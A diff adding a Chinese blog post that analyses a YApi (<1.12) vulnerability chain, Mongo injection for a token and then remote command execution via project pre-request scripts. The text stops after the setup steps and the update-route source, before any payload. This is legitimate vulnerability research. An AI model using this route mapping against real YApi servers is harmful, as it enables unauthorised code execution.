@@ -1,0 +1,1600 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='YApi'>
+<title>YApi远程命令执行漏洞分析</title>
+
+<link rel='canonical' href='https://blog.huamang.xyz/post/yapi/'>
+
+<link rel="stylesheet" href="/scss/style.min.a3acb339192261971279929bada446e8966aa7224703ebfd992d05448daed96b.css"><meta property='og:title' content='YApi远程命令执行漏洞分析'>
+<meta property='og:description' content='YApi'>
+<meta property='og:url' content='https://blog.huamang.xyz/post/yapi/'>
+<meta property='og:site_name' content='Huamang'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2022-12-02T01:44:11&#43;08:00'/><meta property='article:modified_time' content='2022-12-02T01:44:11&#43;08:00'/>
+<meta name="twitter:title" content="YApi远程命令执行漏洞分析">
+<meta name="twitter:description" content="YApi">
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "dark");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu2c79bb77476a4f0f53420443e9db5bfa_18691_300x0_resize_box_3.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Huamang</a></h1>
+            <h2 class="site-description"></h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='https://github.com/Huamang'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://blog.huamang.xyz/index.xml'
+                        target="_blank"
+                        title="RSS"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-rss" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="5" cy="19" r="1" />
+  <path d="M4 4a16 16 0 0 1 16 16" />
+  <path d="M4 11a9 9 0 0 1 9 9" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com/Huamang7'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/about/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>About</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/friends/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>Friends</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>Dark Mode</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#漏洞简介">漏洞简介</a></li>
+    <li><a href="#漏洞分析">漏洞分析</a>
+      <ol>
+        <li><a href="#环境搭建">环境搭建</a></li>
+        <li><a href="#漏洞分析-1">漏洞分析</a>
+          <ol>
+            <li><a href="#rce">RCE</a></li>
+            <li><a href="#sql注入">SQL注入</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+    <li><a href="#漏洞修复">漏洞修复</a>
+      <ol>
+        <li><a href="#sql注入的修复">sql注入的修复</a></li>
+        <li><a href="#命令执行">命令执行</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" style="background-color: #3b58eb; color: #fff;">
+                漏洞分析
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/post/yapi/">YApi远程命令执行漏洞分析</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            YApi&lt;1.12版本下通过MongoDB的盲注拿到Token后进行RCE的漏洞分析
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Dec 02, 2022</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 8 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="漏洞简介">漏洞简介</h1>
+<p>漏洞描述：远程未授权的攻击者可通过注入漏洞获取有效用户token，进而利用自动化测试接口绕过沙箱限制，最终在目标系统上执行任意命令</p>
+<ol>
+<li>
+<p>YApi 1.11.0版本已修复Mongo注入获取Token的问题，导致攻击者无法在未授权的情况下利用此漏洞。</p>
+</li>
+<li>
+<p>在YApi 1.12.0的版本更新中，仅默认禁用了Pre-request和Pre-response脚本功能，使得此漏洞在默认配置下无法利用。</p>
+</li>
+</ol>
+<p>影响版本：YApi &lt; 1.12.0</p>
+<p>参考链接：https://github.com/YMFE/yapi/commit/59bade3a8a43e7db077d38a4b0c7c584f30ddf8c?diff=split</p>
+<h1 id="漏洞分析">漏洞分析</h1>
+<h2 id="环境搭建">环境搭建</h2>
+<p>这里根据官网文档来操作即可，这里我选择的是1.10的版本</p>
+<p><a class="link" href="https://github.com/YMFE/yapi/releases/tag/v1.10.2"  target="_blank" rel="noopener"
+    >https://github.com/YMFE/yapi/releases/tag/v1.10.2</a></p>
+<p>环境搭建的大概步骤，<strong>注意在此之前保证你开启了MongoDB</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">mkdir yapi 
+cd yapi 
+git clone https://github.com/YMFE/yapi.git vendors 
+cp vendors/config_example.json ./config.json // ⚠️  复制完成后把内容修改为 config.json
+cd vendors 
+rm package-lock.json // ⚠️ 一定要删除 package-lock.json 
+npm install --production --registry https://registry.npm.taobao.org 
+npm run install-server 
+node server/app.js 
+</code></pre></td></tr></table>
+</div>
+</div><p><img src="https://tuchuang.huamang.xyz/img/image-20221202020219406.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221202020219406"
+	
+	
+></p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221202020244201.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221202020244201"
+	
+	
+></p>
+<p>这里构建好目录结构为这样</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">|-- config.json
+|-- init.lock
+|-- log
+`-- vendors
+    |-- CHANGELOG.md
+    |-- LICENSE
+    |-- README.md
+    |-- client
+    |-- common
+    |-- config_example.json
+    |-- doc
+    |-- exts
+    |-- nodemon.json
+    |-- npm-debug.log
+    |-- package.json
+    |-- plugin.json
+    |-- server
+    |-- static
+    |-- test
+    |-- webpack.alias.js
+    |-- yapi-base-flow.jpg
+    |-- ydocfile.js
+    `-- ykit.config.js
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="漏洞分析-1">漏洞分析</h2>
+<p>通过漏洞的描述我们可以知道，入手点是：<code>Mongo注入获取Token的</code>，最后的结果是<code>RCE</code></p>
+<h3 id="rce">RCE</h3>
+<p>我们从后往前来推，首先看看这个RCE是如何实现的，从修复点入手，他<strong>默认禁用了Pre-request和Pre-response脚本功能，使得此漏洞在默认配置下无法利用</strong></p>
+<p>可以看到这里common/postmanLib.js的修复，加强了两个判断</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221202161650902.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221202161650902"
+	
+	
+></p>
+<p>我们追踪到他的功能点，是在项目的请求配置里，我们debug一下修改这个内容会进入到哪里</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221202162839070.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221202162839070"
+	
+	
+></p>
+<p>可以很清楚的看到路由是<code>/api/project/up</code>和他POST传入的参数</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221202162941231.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221202162941231"
+	
+	
+></p>
+<p>在common.js中，他识别出project的up</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221202163136930.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221202163136930"
+	
+	
+></p>
+<p>进入controllers/project的up方法，因为我们是直接登录进后台去修改的，所以只需要传入</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span>
+  <span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="mi">11</span><span class="p">,</span>
+  <span class="nt">&#34;pre_script&#34;</span><span class="p">:</span> <span class="s2">&#34;123&#34;</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>这里的鉴权是能直接通过的</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js">  <span class="kr">async</span> <span class="nx">up</span><span class="p">(</span><span class="nx">ctx</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">try</span> <span class="p">{</span>
+      <span class="kd">let</span> <span class="nx">id</span> <span class="o">=</span> <span class="nx">ctx</span><span class="p">.</span><span class="nx">request</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">id</span><span class="p">;</span>
+      <span class="kd">let</span> <span class="nx">params</span> <span class="o">=</span> <span class="nx">ctx</span><span class="p">.</span><span class="nx">request</span><span class="p">.</span><span class="nx">body</span><span class="p">;</span>
+
+      <span class="nx">params</span> <span class="o">=</span> <span class="nx">yapi</span><span class="p">.</span><span class="nx">commons</span><span class="p">.</span><span class="nx">handleParams</span><span class="p">(</span><span class="nx">params</span><span class="p">,</span> <span class="p">{</span>
+        <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;string&#39;</span><span class="p">,</span>
+        <span class="nx">basepath</span><span class="o">:</span> <span class="s1">&#39;string&#39;</span><span class="p">,</span>
+        <span class="nx">group_id</span><span class="o">:</span> <span class="s1">&#39;number&#39;</span><span class="p">,</span>
+        <span class="nx">desc</span><span class="o">:</span> <span class="s1">&#39;string&#39;</span><span class="p">,</span>
+        <span class="nx">pre_script</span><span class="o">:</span> <span class="s1">&#39;string&#39;</span><span class="p">,</span>
+        <span class="nx">after_script</span><span class="o">:</span> <span class="s1">&#39;string&#39;</span><span class="p">,</span>
+        <span class="nx">project_mock_script</span><span class="o">:</span> <span class="s1">&#39;string&#39;</span>
+      <span class="p">});</span>
+
+      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">id</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="p">(</span><span class="nx">ctx</span><span class="p">.</span><span class="nx">body</span> <span class="o">=</span> <span class="nx">yapi</span><span class="p">.</span><span class="nx">commons</span><span class="p">.</span><span class="nx">resReturn</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span> <span class="mi">405</span><span class="p">,</span> <span class="s1">&#39;项目id不能为空&#39;</span><span class="p">));</span>
+      <span class="p">}</span>
+
+      <span class="k">if</span> <span class="p">((</span><span class="kr">await</span> <span class="k">this</span><span class="p">.</span><span class="nx">checkAuth</span><span class="p">(</span><span class="nx">id</span><span class="p">,</span> <span class="s1">&#39;project&#39;</span><span class="p">,</span> <span class="s1">&#39;danger&#39;</span><span class="p">))</span> <span class="o">!==</span> <span class="kc">true</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="p">(</span><span class="nx">ctx</span><span class="p">.</span><span class="nx">body</span> <span class="o">=</span> <span class="nx">yapi</span><span class="p">.</span><span class="nx">commons</span><span class="p">.</span><span class="nx">resReturn</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span> <span class="mi">405</span><span class="p">,</span> <span class="s1">&#39;没有权限&#39;</span><span class="p">));</span>
+      <span class="p">}</span>
+
+      <span class="kd">let</span> <span class="nx">projectData</span> <span class="o">=</span> <span class="kr">await</span> <span class="k">this</span><span class="p">.</span><span class="nx">Model</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="nx">id</span><span class="p">);</span>
+
+      <span class="k">if</span> <span class="p">(</span><span class="nx">params</span><span class="p">.</span><span class="nx">basepath</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">((</span><span class="nx">params</span><span class="p">.</span><span class="nx">basepath</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">handleBasepath</span><span class="p">(</span><span class="nx">params</span><span class="p">.</span><span class="nx">basepath</span><span class="p">))</span> <span class="o">===</span> <span class="kc">false</span><span class="p">)</span> <span class="p">{</span>
+          <span class="k">return</span> <span class="p">(</span><span class="nx">ctx</span><span class="p">.</span><span class="nx">body</span> <span class="o">=</span> <span class="nx">yapi</span><span class="p">.</span><span class="nx">commons</span><span class="p">.</span><span class="nx">resReturn</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span> <span class="mi">401</span><span class="p">,</span> <span class="s1">&#39;basepath格式有误&#39;</span><span class="p">));</span>
+        <span class="p">}</span>
+      <span class="p">}</span>
+
+      <span class="k">if</span> <span class="p">(</span><span class="nx">projectData</span><span class="p">.</span><span class="nx">name</span> <span class="o">===</span> <span class="nx">params</span><span class="p">.</span><span class="nx">name</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">delete</span> <span class="nx">params</span><span class="p">.</span><span class="nx">name</span><span class="p">;</span>
+      <span class="p">}</span>
+
+      <span class="k">if</span> <span class="p">(</span><span class="nx">params</span><span class="p">.</span><span class="nx">name</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kd">let</span> <span class="nx">checkRepeat</span> <span class="o">=</span> <span class="kr">await</span> <span class="k">this</span><span class="p">.</span><span class="nx">Model</span><span class="p">.</span><span class="nx">checkNameRepeat</span><span class="p">(</span><span class="nx">params</span><span class="p">.</span><span class="nx">name</span><span class="p">,</span> <span class="nx">params</span><span class="p">.</span><span class="nx">group_id</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">checkRepeat</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+          <span class="k">return</span> <span class="p">(</span><span class="nx">ctx</span><span class="p">.</span><span class="nx">body</span> <span class="o">=</span> <span class="nx">yapi</span><span class="p">.</span><span class="nx">commons</span><span class="p">.</span><span class="nx">resReturn</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span> <span class="mi">401</span><span class="p">,</span> <span class="s1">&#39;已存在的项目名&#39;</span><span class="p">));</span>
+        <span class="p">}</span>
+      <span class="p">}</span>
+
+      <span class="kd">let</span> <span class="nx">data</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="nx">up_time</span><span class="o">:</span> <span class="nx">yapi</span><span class="p">.</span><span class="nx">commons</span><span class="p">.</span><span class="nx">time</span><span class="p">()</span>
+      <span class="p">};</span>
+
+      <span class="nx">data</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">assign</span><span class="p">({},</span> <span class="nx">data</span><span class="p">,</span> <span class="nx">params</span><span class="p">);</span>
+
+      <span class="kd">let</span> <span class="nx">result</span> <span class="o">=</span> <span class="kr">await</span> <span class="k">this</span><span class="p">.</span><span class="nx">Model</span><span class="p">.</span><span class="nx">up</span><span class="p">(</span><span class="nx">id</span><span class="p">,</span> <span class="nx">data</span><span class="p">);</span>
+      <span class="kd">let</span> <span class="nx">username</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">getUsername</span><span class="p">();</span>
+      <span class="nx">yapi</span><span class="p">.</span><span class="nx">commons</span><span class="p">.</span><span class="nx">saveLog</span><span class="p">({</span>
+        <span class="nx">content</span><span class="o">:</span> <span class="sb">`&lt;a href=&#34;/user/profile/</span><span class="si">${</span><span class="k">this</span><span class="p">.</span><span class="nx">getUid</span><span class="p">()</span><span class="si">}</span><span class="sb">&#34;&gt;</span><span class="si">${</span><span class="nx">username</span><span class="si">}</span><span class="sb">&lt;/a&gt; 更新了项目 &lt;a href=&#34;/project/</span><span class="si">${</span><span class="nx">id</span><span class="si">}</span><span class="sb">/interface/api&#34;&gt;</span><span class="si">${</span>
+          <span class="nx">projectData</span><span class="p">.</span><span class="nx">name</span>
+        <span class="si">}</span><span class="sb">&lt;/a&gt;`</span><span class="p">,</span>
+        <span class="nx">type</span><span class="o">:</span> <span class="s1">&#39;project&#39;</span><span class="p">,</span>
+        <span class="nx">uid</span><span class="o">:</span> <span class="k">this</span><span class="p">.</span><span class="nx">getUid</span><span class="p">(),</span>
+        <span class="nx">username</span><span class="o">:</span> <span class="nx">username</span><span class="p">,</span>
+        <span class="nx">typeid</span><span class="o">:</span> <span class="nx">id</span>
+      <span class="p">});</span>
+      <span class="nx">yapi</span><span class="p">.</span><span class="nx">emitHook</span><span class="p">(</span><span class="s1">&#39;project_up&#39;</span><span class="p">,</span> <span class="nx">result</span><span class="p">).</span><span class="nx">then</span><span class="p">();</span>
+      <span class="nx">ctx</span><span class="p">.</span><span class="nx">body</span> <span class="o">=</span> <span class="nx">yapi</span><span class="p">.</span><span class="nx">commons</span><span class="p">.</span><span class="nx">resReturn</span><span class="p">(</span><span class="nx">result</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+      <span class="nx">ctx</span><span class="p">.</span><span class="nx">body</span> <span class="o">=</span> <span class="nx">yapi</span><span class="p">.</span><span class="nx">commons</span><span class="p">.</span><span class="nx">resReturn</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span> <span class="mi">402</span><span class="p">,</span> <span class="nx">e</span><span class="p">.</span><span class="nx">message</span><span class="p">);</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>他会继续往后面走，执行models/project.js里面的up方法</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221202164008841.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221202164008841"
+	
+	
+></p>
+<p>把pre_script更新进去</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221202164113471.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221202164113471"
+	
+	
+></p>
+<p>那么执行这个脚本的地方在哪里呢，网站都已经给出了api</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221202172903048.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221202172903048"
+	
+	
